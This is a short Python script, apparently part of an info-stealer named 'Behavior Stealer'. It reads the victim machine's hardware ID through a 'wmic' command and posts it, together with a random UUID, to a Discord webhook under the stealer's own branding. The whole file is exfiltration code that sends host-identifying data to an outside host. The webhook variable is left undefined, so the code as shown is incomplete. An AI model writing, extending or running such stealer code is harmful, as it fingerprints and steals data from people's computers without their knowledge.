import subprocess
import uuid
import requests
import json


AVATAR_URL = "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png?ex=684d7494&is=684c2314&hm=cc402308b49849ba4db04ecad335ecb7bdd8e566ef1916b0a8396a37d4bfdb3b&"

def get_hwid():
    return subprocess.check_output("wmic csproduct get uuid", shell=True).decode().split('\n')[1].strip()

def get_uuid():
    return str(uuid.uuid4())

def send_embed():
    username = "Behavior Stealer"
    hwid = get_hwid()
    uuid_val = get_uuid()

    embed = {
        "title": "📁 UUID & HWID",
        "description": f"**HWID:** `{hwid}`\n**UUID:** `{uuid_val}`",
        "color": 0x00FFFF,
        "footer": {"text": "Behavior Stealer \U0001F47E"}
        }
    

    data = {
        "username": username,
        "avatar_url": AVATAR_URL,
        "embeds": [embed]
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(Behavior, data=json.dumps(data), headers=headers)
    print(f"[+] Webhook status: {response.status_code}")


send_embed()
